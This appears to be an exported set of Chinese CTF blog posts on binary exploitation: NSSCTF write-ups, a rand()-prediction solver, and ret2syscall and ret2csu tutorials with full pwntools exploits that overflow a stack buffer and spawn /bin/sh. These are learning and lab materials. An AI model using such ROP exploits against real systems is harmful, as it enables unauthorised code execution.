[{"content":"[HNCTF 2022 Week1]ezr0p32 nssctf链接：https://www.nssctf.cn/problem/2930\n一道简单的ret2text的题目，给的是32位程序，并且还调用了system输出，不过一般是不会在system中echo的，这也是为了照顾新生\n写入/bin/sh调用system即可getshell\n1 2 3 4 5 6 7 8 9 10 11 int dofunc() { char buf[28]; // [esp+Ch] [ebp-1Ch] BYREF system(\u0026#34;echo welcome to xzctf,have a fan time\\n\u0026#34;); puts(\u0026#34;please tell me your name\u0026#34;); read(0, \u0026amp;::buf, 0x100u); puts(\u0026#34;now it\u0026#39;s your play time~\u0026#34;); read(0, buf, 0x30u); return 0; } 原本以为可以快速调试获取shell，但是在gdb中每次运行完system都会出问题\n大致的意思就是system调用时通过vfork创建了子进程，导致gdb去追踪子进程。起初遇到这个问题也是一头雾水的，后面向多位师傅咨询了一下，有效的解决方案大致有两种\nset $eip=0x8048567也就是直接跳过这个函数保持gdb的调试 set follow-fork-mode parent设置保持对父进程的追踪调试 使用follow-fork-mode会更好一些，当然调试的时候输入还是挺麻烦的，可以写进.gdbinit\n以后遇到system函数就可以愉快地ni了~\n","date":"2024-11-16T19:07:39+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/nssctf%E5%88%B7%E9%A2%98%E4%B9%8Bsystem%E4%B8%AD%E7%9A%84vfork%E9%97%AE%E9%A2%98/","title":"nssctf刷题之system中的vfork问题"},{"content":"[LitCTF 2023]口算题卡 nssctf链接：https://www.nssctf.cn/problem/3876\nnc之后提示完成100道加法和减法题目\n使用如下脚本完成\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;,\u0026#34;splitw\u0026#34;,\u0026#34;-v\u0026#34;] p = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28002) def calc(): p.recvuntil(b\u0026#34;What is \u0026#34;) num1 = p.recvuntil(b\u0026#34; \u0026#34;) op = p.recv(1) p.recv(1) num2 = p.recvuntil(b\u0026#34;?\\n\u0026#34;, drop=True) success(num1) success(op) success(num2) if op == b\u0026#39;-\u0026#39;: payload = int(num1) - int(num2) elif op == b\u0026#39;+\u0026#39;: payload = int(num1) + int(num2) success(payload) p.sendline(str(payload)) data = p.recvuntil(b\u0026#34;\\n\u0026#34;) success(data) if data == b\u0026#34;Correct!\\n\u0026#34;: return calc() else: p.interactive() calc() 担心尾递归会有暴栈的可能，后面换成死循环\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;,\u0026#34;splitw\u0026#34;,\u0026#34;-v\u0026#34;] p = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28002) def calc(): while True: p.recvuntil(b\u0026#34;What is \u0026#34;) num1 = p.recvuntil(b\u0026#34; \u0026#34;) op = p.recv(1) p.recv(1) num2 = p.recvuntil(b\u0026#34;?\\n\u0026#34;, drop=True) success(num1) success(op) success(num2) if op == b\u0026#39;-\u0026#39;: payload = int(num1) - int(num2) elif op == b\u0026#39;+\u0026#39;: payload = int(num1) + int(num2) success(payload) p.sendline(str(payload)) data = p.recvuntil(b\u0026#34;\\n\u0026#34;) success(data) if data != b\u0026#34;Correct!\\n\u0026#34;: p.interactive() break calc() ","date":"2024-11-14T15:16:06+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/nssctf%E5%88%B7%E9%A2%98%E4%B9%8B%E8%AE%A1%E7%AE%97%E9%A2%98/","title":"nssctf刷题之计算题"},{"content":"[GDOUCTF 2023]真男人下120层 nssctf地址：https://www.nssctf.cn/problem/3663\n不是平常的漏洞利用，主要是针对随机数的条件匹配\n看了一些wp发现很多都是用ctypes这个库，了解了一下还是很有学习的必要，顺便学习一下新的函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 int __fastcall main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int v4; // eax int v6; // [rsp+8h] [rbp-18h] BYREF unsigned int i; // [rsp+Ch] [rbp-14h] __int64 v8; // [rsp+10h] [rbp-10h] unsigned __int64 v9; // [rsp+18h] [rbp-8h] v9 = __readfsqword(0x28u); setbuf(_bss_start, 0LL); v3 = time(0LL); // 返回当前时间戳 srand(v3); // 设置随机数种子 v8 = 2772839826LL; v4 = rand(); // 依据上面的种子生成随机数 srand(v4 % 3 - 1522127470); // 重新设置种子 printf(\u0026#34;\\x1B[31m\u0026#34;); puts(\u0026#34;\\n\\n\u0026#34;); puts(\u0026#34; ## ## ####### ####### ######## ####### \u0026#34;); puts(\u0026#34; ## ## ### ## ## ## \u0026#34;); puts(\u0026#34; ####### ### ## ## #### \u0026#34;); puts(\u0026#34; ## ## ### ## ## ## \u0026#34;); puts(\u0026#34; ## ## ####### ####### ## ## \\n\\n\u0026#34;); printf(\u0026#34;\\x1B[0m\u0026#34;); puts(\u0026#34;Welcome!\u0026#34;); puts(aThereAreFourDo); puts(\u0026#34;Only one door leads to the right path. If you choose the wrong one, you will be killed by a trap.\\n\u0026#34;); for ( i = 1; (int)i \u0026lt;= 120; ++i ) // 通过120次的条件满足输出flag { print_door(); printf(\u0026#34;\\t\\t\\tFloor %d\\n\\n\u0026#34;, i); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v6); if ( rand() % 4 + 1 != v6 ) { printf(\u0026#34;\\x1B[31m\u0026#34;); puts(\u0026#34;YOU DIED!\u0026#34;); printf(\u0026#34;\\x1B[0m\u0026#34;); return 0; } system(\u0026#34;clear\u0026#34;); } puts(\u0026#34;Congratulation!\u0026#34;); cat_flag(); return 0; } time() 这是一个返回距离1970年1月1日00:00:00 UTC经过的秒数\n1 time_t time(time_t *t); 该函数有两种用法\n返回值接收时间戳，参数为0或NULL 变量接收时间戳，函数参数为该变量指针 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { time_t current_time_1 = time(0); // 1 time_t current_time_2 = time(NULL); // 1 time_t current_time_3; time(\u0026amp;current_time_3); // 2 printf(\u0026#34;current_time_1=%ld\\n\u0026#34;,current_time_1); printf(\u0026#34;current_time_2=%ld\\n\u0026#34;,current_time_2); printf(\u0026#34;current_time_3=%ld\\n\u0026#34;,current_time_3); return 0; } srand() 用于设置伪随机数种子的函数，种子决定随机数的值，为了让伪随机不那么伪随机通常参数用当前的时间戳\n1 void srand(unsigned int seed); rand() 返回伪随机数的函数\n1 int rand(void); 没有调用srand()设置随机数种子，就相当于srand(1)，也就是默认种子是1\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { srand(1); for(int i = 0;i \u0026lt; 5;i++) printf(\u0026#34;%d \u0026#34;,rand()); printf(\u0026#34;\\n\u0026#34;); return 0; } python库ctypes ctypes是一个提供C语言共享库接口的python标准库，通过ctypes可以在python调用C语言的函数。反编译出来的伪代码显示程序是用某一时刻的时间戳作为随机数种子，除非手速足够快可以让python脚本和C程序同时运行（当然这基本不可能）获取相同的时间戳，不然只能在python调用C函数或者在python中运行C程序来实现时间戳的统一。\nctypes解题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from pwn import * import sys import ctypes context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;,\u0026#34;splitw\u0026#34;,\u0026#34;-v\u0026#34;] elf = ELF(\u0026#39;./bin\u0026#39;) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#34;local\u0026#34;: p = process(\u0026#34;./bin\u0026#34;) libc = elf.libc gdb.attach(p) else: p = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28283) # 调用C函数 libc = ctypes.CDLL(\u0026#34;libc.so.6\u0026#34;) libc.srand.argtypes = [ctypes.c_uint] libc.srand(libc.time(0)) res = libc.rand() libc.srand(res % 3 - 1522127470) p.recvuntil(b\u0026#34;trap.\\n\u0026#34;) for i in range(120): rand_r = libc.rand() % 4 + 1 p.sendlineafter(f\u0026#34;Floor {i + 1}\\n\\n\u0026#34;.encode(),str(rand_r).encode()) p.interactive() 运行C程序解题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * import sys import subprocess context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;,\u0026#34;splitw\u0026#34;,\u0026#34;-v\u0026#34;] elf = ELF(\u0026#39;./bin\u0026#39;) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#34;local\u0026#34;: p = process(\u0026#34;./bin\u0026#34;) libc = elf.libc gdb.attach(p) else: p = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28283) res = subprocess.run([\u0026#34;./demo\u0026#34;], capture_output=True, text=True).stdout res = res.replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;) res = res.split() p.recvuntil(b\u0026#34;trap.\\n\u0026#34;) for i in range(120): rand_r = res[i] p.sendlineafter(f\u0026#34;Floor {i + 1}\\n\\n\u0026#34;.encode(), rand_r) p.interactive() 当然要提前编译好C程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // gcc demo.c -o demo #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { srand(time(0)); srand(rand() % 3 - 1522127470); for(int i = 1;i \u0026lt;= 120;i++) { printf(\u0026#34;%d \\n\u0026#34;,rand() % 4 + 1); } return 0; } 小结 不是什么漏洞利用的pwn题，见过练一练就有思路怎么做了，新手做一做可以开拓下知识面\n","date":"2024-11-13T20:36:26+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/nssctf%E5%88%B7%E9%A2%98%E4%B9%8B%E5%81%B6%E9%81%87%E6%96%B0%E6%A8%A1%E5%9D%97ctypes/","title":"nssctf刷题之偶遇新模块ctypes"},{"content":"ret2syscall 静态编译 静态编译是在编译时将所有必需的库和依赖项直接包含在生成的可执行文件中，最终的可执行文件包含了所有的代码，运行时不需要依赖外部库\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ret2syscall.c #include\u0026lt;stdio.h\u0026gt; int dofunc() { char data[8]={}; write(1,\u0026#34;input:\u0026#34;,6); read(0,data,0x100); return 0; } int main() { dofunc(); return 0; } 1 gcc ret2syscall.c -fno-stack-protector -no-pie -static -o ret2syscall_x64 在gdb中查看内存信息，相比于动态链接内存中几乎只剩下程序，所有的依赖已经打包在可执行文件中\n静态编译后的main相比于动态编译的要短非常多，而且也找不到system和do_system\nsystem底层实现 system\n1 2 3 4 5 6 7 8 9 10 11 12 int __libc_system (const char *line) { if (line == NULL) /* Check that we have a command processor available. It might not be available after a chroot(), for example. */ return do_system (\u0026#34;exit 0\u0026#34;) == 0; return do_system (line); } weak_alias (__libc_system, system) // 宏将__libc_system函数定义为system函数的弱别名。在链接时，如果没有其他定义的system函数，链接器会使用这个定义 do_system\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 /* Execute LINE as a shell command, returning its status. */ static int do_system (const char *line) { int status = -1; int ret; pid_t pid; struct sigaction sa; #ifndef _LIBC_REENTRANT struct sigaction intr, quit; #endif sigset_t omask; sigset_t reset; sa.sa_handler = SIG_IGN; sa.sa_flags = 0; __sigemptyset (\u0026amp;sa.sa_mask); DO_LOCK (); if (ADD_REF () == 0) { /* sigaction can not fail with SIGINT/SIGQUIT used with SIG_IGN. */ __sigaction (SIGINT, \u0026amp;sa, \u0026amp;intr); __sigaction (SIGQUIT, \u0026amp;sa, \u0026amp;quit); } DO_UNLOCK (); __sigaddset (\u0026amp;sa.sa_mask, SIGCHLD); /* sigprocmask can not fail with SIG_BLOCK used with valid input arguments. */ __sigprocmask (SIG_BLOCK, \u0026amp;sa.sa_mask, \u0026amp;omask); __sigemptyset (\u0026amp;reset); if (intr.sa_handler != SIG_IGN) __sigaddset(\u0026amp;reset, SIGINT); if (quit.sa_handler != SIG_IGN) __sigaddset(\u0026amp;reset, SIGQUIT); posix_spawnattr_t spawn_attr; /* None of the posix_spawnattr_* function returns an error, including posix_spawnattr_setflags for the follow specific usage (using valid flags). */ __posix_spawnattr_init (\u0026amp;spawn_attr); __posix_spawnattr_setsigmask (\u0026amp;spawn_attr, \u0026amp;omask); __posix_spawnattr_setsigdefault (\u0026amp;spawn_attr, \u0026amp;reset); __posix_spawnattr_setflags (\u0026amp;spawn_attr, POSIX_SPAWN_SETSIGDEF | POSIX_SPAWN_SETSIGMASK); ret = __posix_spawn (\u0026amp;pid, SHELL_PATH, 0, \u0026amp;spawn_attr, (char *const[]){ (char *) SHELL_NAME, (char *) \u0026#34;-c\u0026#34;, (char *) \u0026#34;--\u0026#34;, (char *) line, NULL }, __environ); __posix_spawnattr_destroy (\u0026amp;spawn_attr); if (ret == 0) { /* Cancellation results in cleanup handlers running as exceptions in the block where they were installed, so it is safe to reference stack variable allocate in the broader scope. */ #if defined(_LIBC_REENTRANT) \u0026amp;\u0026amp; defined(SIGCANCEL) struct cancel_handler_args cancel_args = { .quit = \u0026amp;quit, .intr = \u0026amp;intr, .pid = pid }; __libc_cleanup_region_start (1, cancel_handler, \u0026amp;cancel_args); #endif /* Note the system() is a cancellation point. But since we call waitpid() which itself is a cancellation point we do not have to do anything here. */ if (TEMP_FAILURE_RETRY (__waitpid (pid, \u0026amp;status, 0)) != pid) status = -1; #if defined(_LIBC_REENTRANT) \u0026amp;\u0026amp; defined(SIGCANCEL) __libc_cleanup_region_end (0); #endif } else /* POSIX states that failure to execute the shell should return as if the shell had terminated using _exit(127). */ status = W_EXITCODE (127, 0); /* sigaction can not fail with SIGINT/SIGQUIT used with old disposition. Same applies for sigprocmask. */ DO_LOCK (); if (SUB_REF () == 0) { __sigaction (SIGINT, \u0026amp;intr, NULL); __sigaction (SIGQUIT, \u0026amp;quit, NULL); } DO_UNLOCK (); __sigprocmask (SIG_SETMASK, \u0026amp;omask, NULL); if (ret != 0) __set_errno (ret); return status; } 后面的流程比较复杂这里省略，最后到execv\n1 2 3 4 5 6 7 8 9 #include \u0026lt;unistd.h\u0026gt; /* Execute PATH with arguments ARGV and environment from `environ\u0026#39;. */ int execv (const char *path, char *const argv[]) { return __execve (path, argv, __environ); } execve后面就是系统调用的流程，需要调试的时候反汇编\n1 2 3 4 5 6 7 8 9 10 11 12 13 pwndbg\u0026gt; disassemble execve Dump of assembler code for function __GI_execve: 0x00007ffff7e9d200 \u0026lt;+0\u0026gt;: mov eax,0x3b 0x00007ffff7e9d205 \u0026lt;+5\u0026gt;: syscall 0x00007ffff7e9d207 \u0026lt;+7\u0026gt;: cmp rax,0xfffffffffffff001 0x00007ffff7e9d20d \u0026lt;+13\u0026gt;: jae 0x7ffff7e9d210 \u0026lt;__GI_execve+16\u0026gt; 0x00007ffff7e9d20f \u0026lt;+15\u0026gt;: ret 0x00007ffff7e9d210 \u0026lt;+16\u0026gt;: mov rcx,QWORD PTR [rip+0xffbe9] # 0x7ffff7f9ce00 0x00007ffff7e9d217 \u0026lt;+23\u0026gt;: neg eax 0x00007ffff7e9d219 \u0026lt;+25\u0026gt;: mov DWORD PTR fs:[rcx],eax 0x00007ffff7e9d21c \u0026lt;+28\u0026gt;: or rax,0xffffffffffffffff 0x00007ffff7e9d220 \u0026lt;+32\u0026gt;: ret End of assembler dump. 这里可以看出0x3b就是execve的系统调用号\n栈布局 execve(\u0026quot;/bin/sh\u0026quot;,0,0)\n查找 gadget\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 0x0000000000415b86 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret 0x0000000000401fb1 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004062c3 : pop r12 ; pop r13 ; pop r14 ; ret 0x000000000042fda4 : pop r12 ; pop r13 ; pop rbp ; ret 0x000000000040571c : pop r12 ; pop r13 ; ret 0x000000000042bea6 : pop r12 ; pop rbp ; ret 0x0000000000402367 : pop r12 ; ret 0x0000000000415b88 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret 0x0000000000401fb3 : pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004062c5 : pop r13 ; pop r14 ; ret 0x000000000042fda6 : pop r13 ; pop rbp ; ret 0x000000000040571e : pop r13 ; ret 0x0000000000415b8a : pop r14 ; pop r15 ; pop rbp ; ret 0x0000000000401fb5 : pop r14 ; pop r15 ; ret 0x00000000004062c7 : pop r14 ; ret 0x0000000000415b8c : pop r15 ; pop rbp ; ret 0x0000000000401fb7 : pop r15 ; ret 0x000000000045fcc6 : pop rax ; pop rdx ; pop rbx ; ret 0x0000000000410747 : pop rax ; ret # 1 0x0000000000401fb0 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004062c2 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret 0x000000000040571b : pop rbp ; pop r12 ; pop r13 ; ret 0x0000000000402366 : pop rbp ; pop r12 ; ret 0x0000000000415b89 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret 0x0000000000401fb4 : pop rbp ; pop r14 ; pop r15 ; ret 0x00000000004062c6 : pop rbp ; pop r14 ; ret 0x000000000042fda7 : pop rbp ; pop rbp ; ret 0x0000000000462578 : pop rbp ; pop rbx ; ret 0x000000000040164a : pop rbp ; ret 0x000000000042fda3 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret 0x000000000042bea5 : pop rbx ; pop r12 ; pop rbp ; ret 0x0000000000441a4e : pop rbx ; pop r12 ; ret 0x0000000000406a20 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret 0x0000000000405cb5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret 0x0000000000402365 : pop rbx ; pop rbp ; pop r12 ; ret 0x0000000000401649 : pop rbx ; pop rbp ; ret 0x00000000004018f8 : pop rbx ; ret 0x0000000000415b8d : pop rdi ; pop rbp ; ret 0x0000000000401fb8 : pop rdi ; ret # 2 0x000000000045fcc7 : pop rdx ; pop rbx ; ret # 4 0x000000000040416a : pop rdx ; ret 9 0x0000000000415b8b : pop rsi ; pop r15 ; pop rbp ; ret 0x0000000000401fb6 : pop rsi ; pop r15 ; ret 0x00000000004062c8 : pop rsi ; ret # 3 0x0000000000415b87 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret 0x0000000000401fb2 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004062c4 : pop rsp ; pop r13 ; pop r14 ; ret 0x000000000042fda5 : pop rsp ; pop r13 ; pop rbp ; ret 0x000000000040571d : pop rsp ; pop r13 ; ret 0x000000000042bea7 : pop rsp ; pop rbp ; ret 0x0000000000402368 : pop rsp ; ret 0x0000000000401016 : ret 参数 通过系统调用执行execve需要三个参数，最后要是execve(\u0026quot;/bin/sh\u0026quot;,0,0)这个样子\n如果程序中没有字符串/bin/sh如何处理呢？\n此时可以先通过read往bss段中写入/bin/sh\n为什么是bss段？ bss段通常是可读可写的，里面存储的是未初始化的变量，对bss段的对齐数据进行改动一般不影响程序运行\n什么是对齐数据？\n这是内存对齐的重要过程为了确保数据对齐在合适的边界上，编译器通常会在数据结构的成员之间或结构体末尾插入填充字节（padding）。这些填充字节通常没有特定的内容，只是占位用的字节，填充的具体内容通常没有任何含义。这些数据一般初始化为0x00\nx86下系统调用\n1 2 3 4 5 6 ; write(1,msg,len) mov eax, 4 ; 系统调用号 4 对应的是 write mov ebx, 1 ; 文件描述符 1 对应标准输出 mov ecx, msg ; 要写入的数据 mov edx, len ; 数据长度 int 0x80 ; 触发系统调用 x86的系统调用为了提高运行效率使用寄存器给系统调用传参\neax：系统调用号\nebx：第一个参数\necx：第二个参数\nedx：第三个参数\nesi：第四个参数\nedi：第五个参数\nebp：第六个参数\nx64下系统调用\n1 2 3 4 5 6 ; write(1,msg,len) mov rax, 1 ; 系统调用号 1 对应的是 sys_write mov rdi, 1 ; 文件描述符 1 对应标准输出 mov rsi, msg ; 要写入的数据 mov rdx, len ; 数据长度 syscall ; 触发系统调用 exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from pwn import * import sys context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; p = process(\u0026#34;./ret2syscall_x64\u0026#34;) #if len(sys.argv) == 2 and sys.argv[1] == \u0026#39;p\u0026#39;: # gdb.attach(p) padding = 0x10 syscall = 0x41073e pop_rax_ret = 0x410747 pop_rdi_ret = 0x401fb8 pop_rsi_ret = 0x4062c8 pop_rdx_rbx_ret = 0x45fcc7 bss = 0x4A22D0 dofunc = 0x4017b5 def fun(rax, rdi, rsi, rdx, syscall_addr, ret_addr): return flat(pop_rax_ret, rax, pop_rdi_ret, rdi, pop_rsi_ret, rsi, pop_rdx_rbx_ret, rdx, 0, syscall_addr, ret_addr) # read(0, bss, 8) payload = padding * b\u0026#39;a\u0026#39; payload += fun(0, 0, bss, len(b\u0026#34;/bin/sh\\00\u0026#34;), syscall, dofunc) p.sendafter(b\u0026#34;input:\u0026#34;, payload) p.send(b\u0026#34;/bin/sh\\00\u0026#34;) # execve(\u0026#34;/bin/sh\u0026#34;, 0, 0) payload = padding * b\u0026#39;a\u0026#39; payload += fun(59, bss, 0, 0, syscall, dofunc) p.sendafter(b\u0026#34;input:\u0026#34;, payload) p.interactive() ","date":"2024-11-12T16:47:29+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall/","title":"栈溢出之ret2syscall"},{"content":"ret2csu __libc_csu_init是 GNU C Library (glibc) 中的一个初始化函数，csu 通常指的是 \u0026ldquo;C Runtime Startup\u0026rdquo; 或 \u0026ldquo;C Startup\u0026rdquo;。这个函数主要用于 C 程序的启动过程，特别是在涉及到 C++ 构造函数和全局对象的初始化时。\n下面的代码片段通常用于ret2csu\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0x401270 \u0026lt;__libc_csu_init+64\u0026gt;: mov rdx,r14 0x401273 \u0026lt;__libc_csu_init+67\u0026gt;: mov rsi,r13 0x401276 \u0026lt;__libc_csu_init+70\u0026gt;: mov edi,r12d 0x401279 \u0026lt;__libc_csu_init+73\u0026gt;: call QWORD PTR [r15+rbx*8] 0x40127d \u0026lt;__libc_csu_init+77\u0026gt;: add rbx,0x1 0x401281 \u0026lt;__libc_csu_init+81\u0026gt;: cmp rbp,rbx 0x401284 \u0026lt;__libc_csu_init+84\u0026gt;: jne 0x401270 \u0026lt;__libc_csu_init+64\u0026gt; 0x401286 \u0026lt;__libc_csu_init+86\u0026gt;: add rsp,0x8 0x40128a \u0026lt;__libc_csu_init+90\u0026gt;: pop rbx 0x40128b \u0026lt;__libc_csu_init+91\u0026gt;: pop rbp 0x40128c \u0026lt;__libc_csu_init+92\u0026gt;: pop r12 0x40128e \u0026lt;__libc_csu_init+94\u0026gt;: pop r13 0x401290 \u0026lt;__libc_csu_init+96\u0026gt;: pop r14 0x401292 \u0026lt;__libc_csu_init+98\u0026gt;: pop r15 0x401294 \u0026lt;__libc_csu_init+100\u0026gt;: ret 利用上面的gadget有下面的控制关系\nrbp = rbx + 1 防止跳到\u0026lt;__libc_csu_init+64\u0026gt;，顺利执行到ret\nr15 =\u0026gt; func 若rbx为0，控制了r15就能指向指定内存区域\nr12 =\u0026gt; rdi 通过r12控制rdi，解决x64下第一个参数的传递问题\nr13 =\u0026gt; rsi 通过r13控制rsi，解决x64下第二个参数的传递问题\nr14 =\u0026gt; rdx 通过r14控制rdx，解决x64下第三个参数的传递问题\n上面的寄存器都能控制的话就可以非常随意得调用三个及三个以下参数的函数\n值得注意的是下面就有对各种寄存器的pop，只需要使用这些gadget在栈上构造payload\n思路 首先布栈，调用pop\n1 2 3 4 5 6 7 0x40128a \u0026lt;__libc_csu_init+90\u0026gt;: pop rbx 0x40128b \u0026lt;__libc_csu_init+91\u0026gt;: pop rbp 0x40128c \u0026lt;__libc_csu_init+92\u0026gt;: pop r12 0x40128e \u0026lt;__libc_csu_init+94\u0026gt;: pop r13 0x401290 \u0026lt;__libc_csu_init+96\u0026gt;: pop r14 0x401292 \u0026lt;__libc_csu_init+98\u0026gt;: pop r15 0x401294 \u0026lt;__libc_csu_init+100\u0026gt;: ret ret直接跳转到0x401270 \u0026lt;__libc_csu_init+64\u0026gt;，给传参的寄存器传值\n1 2 3 0x401270 \u0026lt;__libc_csu_init+64\u0026gt;: mov rdx,r14 0x401273 \u0026lt;__libc_csu_init+67\u0026gt;: mov rsi,r13 0x401276 \u0026lt;__libc_csu_init+70\u0026gt;: mov edi,r12d 调用函数\n1 0x401279 \u0026lt;__libc_csu_init+73\u0026gt;: call QWORD PTR [r15+rbx*8] 注意要让rbp = rbx + 1防止二次调用\n1 2 0x401281 \u0026lt;__libc_csu_init+81\u0026gt;: cmp rbp,rbx 0x401284 \u0026lt;__libc_csu_init+84\u0026gt;: jne 0x401270 \u0026lt;__libc_csu_init+64\u0026gt; 布栈数据\n0x40128a处获得pop指令，下面按顺序把值传入寄存器，这里是为了给函数传参 0x401270处是ret的返回地址，这里控制rip到0x401270执行函数传参和函数调用 调用完函数会根据rbp和rbx的值决定是否往上跳转，这里一定要有上面的等式关系不往上跳转 add rsp,0x8给rsp加了8个字节，正好是一个地址的长度，这块地址随便填，也就是上面的0xdeadbeef 后面又pop各种寄存器，此时传什么参数不关心，因为已经调过函数了，只要有东西传即可， 上面执行完就走完了函数__libc_csu_init，返回地址就是下一个函数的地址，一般用exit退出程序 不同版本的libc的__libc_csu_init反汇编出来的代码会有差异，具体要根据实际的汇编代码布栈\n不同利用方式的比较 溢出函数 =\u0026gt; __libc_csu_init =\u0026gt; 溢出函数 =\u0026gt; system\n优点：溢出函数的payload比__libc_csu_init的少，适用于溢出空间较小的情况 缺点：溢出函数需要额外gadget给寄存器传参 溢出函数 =\u0026gt; __libc_csu_init =\u0026gt; __libc_csu_init =\u0026gt; system\n优点：__libc_csu_init有良好的传参环境，不需要额外的gadget 缺点：__libc_csu_init构造的payload比溢出函数的多，适用于溢出空间较大的情况 第一个 payload 都是泄露 libc 的基地址\n例题 ret2csu_x64_csu\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.arch = \u0026#39;amd64\u0026#39; io = process(\u0026#39;./ret2csu_x64_csu\u0026#39;) elf = ELF(\u0026#39;./ret2csu_x64_csu\u0026#39;) libc = elf.libc gdb.attach(io, \u0026#39;b *main\u0026#39;) padding = 0x118 - 0xf0 pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40128A mov_call = 0x401270 return_addr = 0x401176 # main pop_rdi = 0x401293 def ret2csu(rdi,rsi,rdx,fun_addr,return_addr): return flat(pop_rbx_rbp_r12_r13_r14_r15_ret, 0,1,rdi,rsi,rdx,fun_addr, mov_call, 0,0,0,0,0,0,0, return_addr ) puts_addr = elf.got[\u0026#39;puts\u0026#39;] success(f\u0026#34;puts_addr:{hex(puts_addr)}\u0026#34;) read_got = elf.got[\u0026#39;read\u0026#39;] # puts泄露函数地址 这里其实可以直接rop，为了演示用csu payload = padding * b\u0026#39;a\u0026#39; payload += ret2csu(read_got,0,0,puts_addr,return_addr) io.sendafter(b\u0026#34;Pls Input\\n\u0026#34;, payload) read_addr = u64(io.recvuntil(b\u0026#39;\\x7f\u0026#39;).ljust(8, b\u0026#39;\\x00\u0026#39;)) success(hex(read_addr)) # 计算libc基地址 libc_base = read_addr - libc.sym[\u0026#39;read\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] success(hex(system_addr)) bin_sh_addr = next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) + libc_base success(hex(bin_sh_addr)) # system(\u0026#34;/bin/sh\u0026#34;) -\u0026gt; getshell payload = padding * b\u0026#39;a\u0026#39; payload += flat(pop_rdi, bin_sh_addr, 0x40101a, system_addr) # 0x40101a -\u0026gt; ret io.sendafter(b\u0026#34;Pls Input\\n\u0026#34;, payload) io.interactive() ","date":"2024-11-07T16:00:51+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/ret2csu/","title":"Ret2csu"},{"content":"","date":"2024-11-06T19:40:39+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/%E6%A0%88%E8%BF%81%E7%A7%BB/","title":"栈迁移"},{"content":"关于PIE绕过的学习 